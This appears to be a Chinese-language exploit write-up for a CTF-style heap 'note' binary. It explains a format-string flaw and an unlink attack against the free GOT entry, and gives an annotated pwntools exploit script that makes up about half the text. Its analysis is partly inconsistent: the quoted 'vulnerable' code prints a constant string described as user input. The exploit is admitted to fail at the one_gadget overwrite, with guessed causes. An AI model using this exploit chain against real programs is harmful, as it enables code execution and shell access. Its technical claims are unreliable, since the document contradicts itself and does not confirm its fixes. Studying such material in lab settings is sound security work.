# 漏洞利用文档

## 执行环境
基于调试记录和程序分析，程序的运行环境如下：
- **架构**：x86-64
- **保护机制**：
  - Partial RELRO：GOT表可写，允许覆盖函数指针
  - Stack Canary：栈保护启用，但位置已知
  - NX：数据段不可执行，需通过ROP或GOT覆盖绕过
  - No PIE：代码段和全局变量地址固定，便于利用
- **依赖**：标准libc（版本通过泄露地址确定），动态链接
- **运行要求**：程序需要用户输入姓名和地址，超时设置为60秒

## 漏洞成因
### 关键结构体
程序使用全局数组管理笔记：
- `ptr`数组（地址0x602120）：存储4个笔记指针，每个8字节
- `qword_602140`数组（地址0x602140）：存储对应笔记大小，每个8字节
- `dword_602160`（地址0x602160）：笔记计数器，4字节

### 漏洞分析
**漏洞位置**：`sub_400D43()`函数中的格式化字符串漏洞
- **漏洞代码**：
  ```c
  v7 = (char *)malloc(0xA0u);
  strcpy(v7, "TheNewContents:");
  printf(v7);  // 直接使用用户输入作为格式化字符串
  ```
- **成因**：
  - 用户输入的字符串`v7`被直接传递给`printf`作为格式化字符串参数
  - 虽然`sub_400B10()`函数会过滤'%'字符，但过滤操作在`printf(v7)`调用之后执行，因此无效
  - 用户可通过输入格式化字符串（如`%p`、`%x`、`%s`、`%n`）读取或写入任意内存地址
- **影响**：可导致信息泄露（如libc地址）、任意地址写（如覆盖GOT条目），最终实现代码执行

## 漏洞利用过程
利用过程结合了格式化字符串漏洞和堆漏洞（unlink攻击），以下是关键步骤的内存变化总结：

| 步骤 | 操作 | 堆内存变化 | 全局变量变化 | 关键地址状态 |
|------|------|------------|--------------|--------------|
| 1-2 | 输入姓名和地址 | 堆未初始化 | 姓名"/bin/sh"存储于0x6020e0，地址"ddd"存储于0x602180 | GOT未解析，栈Canary启用 |
| 3 | 创建笔记0（伪造chunk） | 分配chunk0(0x7cc4000)，数据区构造伪造元数据：size=0xa1, fd=0x602108, bk=0x602110 | ptr[0]=0x7cc4010, size[0]=0x80 | 伪造指针指向全局变量区域 |
| 4 | 创建笔记1（小chunk） | 分配chunk1(0x7cc4090)，数据区存储"aa" | ptr[1]=0x7cc40a0, size[1]=0x0 | fastbin准备 |
| 5 | 创建笔记2（存储"/bin/sh"） | 分配chunk2(0x7cc40b0)，数据区存储"/bin/sh" | ptr[2]=0x7cc40c0, size[2]=0x80 | "/bin/sh"字符串就位 |
| 6 | 删除笔记1 | chunk1释放进入fastbin（size=0x21） | ptr[1]未清空（UAF） | fastbin包含chunk1 |
| 7 | 重新分配笔记1 | chunk1重新分配，写入伪造size数据：0xa0和0x90 | ptr[1]更新为0x7cc40a0 | 堆元数据被篡改 |
| 8 | 删除笔记2 | 触发unlink攻击，chunk2释放 | ptr[0]被修改为0x602108（unlink成功） | 全局指针劫持 |
| 9 | 编辑笔记0 | 写入payload：0x18*'a' + free_got地址 | ptr[0]被覆盖为free_got地址(0x602018) | 指向GOT条目 |
| 10 | 显示笔记0 | 触发格式化字符串漏洞，泄露free地址 | 无变化 | free_addr = 0x7fdf19cc7540（libc地址泄露） |
| 11 | 计算并覆盖free_got | 尝试用one_gadget覆盖free_got | free_got未被成功覆盖（失败） | 利用失败，程序崩溃 |
| 12 | 交互 | 程序终止（SIGABRT） | 无变化 | free_got仍指向原始libc函数 |

### 内存变化关键点：
- **堆布局**：通过创建和删除笔记，构造了特定的堆结构，为unlink攻击做准备。
- **unlink攻击**：成功修改ptr[0]指向全局变量区域，实现任意地址写。
- **格式化字符串漏洞**：用于泄露libc地址和尝试覆盖GOT，但覆盖操作失败。
- **利用失败原因**：在Step 11中，one_gadget地址可能计算错误或写入方式不正确，导致free_got未被覆盖。

## Exploit
以下是漏洞利用脚本（exp）的注释版本，基于用户提供的代码和调试记录：

```python
from pwn import *

# 设置调试环境和上下文
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process("./data/sample3")
elf = ELF("./data/sample3")
libc = elf.libc  # 获取libc对象，用于计算偏移

# 定义笔记操作函数
def new_note(size, content):
    p.recvuntil(">>")
    p.sendline(b"1")
    p.recvuntil(")")
    p.sendline(str(size).encode())
    p.recvuntil(":")
    p.sendline(content)

def show_note(index):
    p.recvuntil(">>")
    p.sendline(b"2")
    p.recvuntil(":")
    p.sendline(str(index).encode())

def edit_note(index, choice, content):
    p.recvuntil(">>")
    p.sendline(b"3")
    p.recvuntil(":")
    p.sendline(str(index).encode())
    p.recvuntil("]")
    p.sendline(str(choice).encode())
    p.recvuntil(":")
    p.sendline(content)

def delete_note(index):
    p.recvuntil(">>")
    p.sendline(b"4")
    p.recvuntil(":")
    p.sendline(str(index).encode())

# Step 1-2: 初始输入，存储"/bin/sh"字符串到全局变量
p.recvuntil(":"); p.sendline(b"/bin/sh")  # 姓名输入，用于后续system调用
p.recvuntil(":"); p.sendline(b"ddd")     # 地址输入，无关紧要

# Step 3: 创建笔记0，构造伪造堆chunk用于unlink攻击
ptr_0 = 0x602120        # ptr数组地址
fake_fd = ptr_0 - 0x18  # 伪造fd指针，指向全局变量区域
fake_bk = ptr_0 - 0x10  # 伪造bk指针，指向全局变量区域
note0_content = b'\x00' * 8 + p64(0xa1) + p64(fake_fd) + p64(fake_bk)  # 伪造chunk元数据
new_note(0x80, note0_content)  # 分配0x80字节笔记

# Step 4: 创建笔记1，小chunk用于fastbin操作
new_note(0x0, b'aa')  # 分配最小chunk，内容为"aa"

# Step 5: 创建笔记2，存储"/bin/sh"字符串
new_note(0x80, b'/bin/sh')  # 分配0x80字节笔记，内容为"/bin/sh"

# Step 6: 删除笔记1，释放chunk到fastbin
delete_note(1)

# Step 7: 重新分配笔记1，写入伪造的size数据
note1_content = b'\x00' * 16 + p64(0xa0) + p64(0x90)  # 伪造size字段
new_note(0x0, note1_content)  # 重新分配同一chunk

# Step 8: 删除笔记2，触发unlink攻击，修改ptr[0]
delete_note(2)  # 触发unlink，ptr[0]被覆盖为0x602108

# Step 9: 编辑笔记0，写入payload指向free_got
free_got = elf.got['free']  # 获取free函数的GOT地址
payload = 0x18 * b'a' + p64(free_got)  # 构造payload：填充后接free_got地址
edit_note(0, 1, payload)  # 编辑笔记0，覆盖ptr[0]为free_got地址

# Step 10: 显示笔记0，触发格式化字符串漏洞，泄露free地址
show_note(0)
p.recvuntil('is ')
free_addr = u64(p.recv(6).ljust(8, b'\x00'))  # 泄露free函数在libc中的地址

# Step 11: 计算libc基址和system/one_gadget地址，尝试覆盖free_got
libc_addr = free_addr - libc.symbols['free']  # 计算libc基址
system_addr = libc_addr + libc.symbols['system']  # 计算system函数地址
one_gadget = libc_addr + 0xf1247  # 计算one_gadget地址（可能不正确）
edit_note(0, 1, p64(one_gadget))  # 尝试覆盖free_got为one_gadget（失败）

# Step 12: 交互，预期获取shell但失败
p.interactive()  # 程序崩溃，未获得shell
```

### 注释说明：
- **关键步骤**：exp通过堆布局和unlink攻击实现任意地址写，结合格式化字符串漏洞泄露libc地址。
- **失败点**：Step 11中one_gadget地址可能错误，或覆盖方式不正确，导致free_got未被修改。建议使用`system_addr`并确保payload正确触发。
- **改进建议**：验证one_gadget偏移，或直接使用`system_addr`覆盖free_got，然后通过删除包含"/bin/sh"的笔记触发system调用。
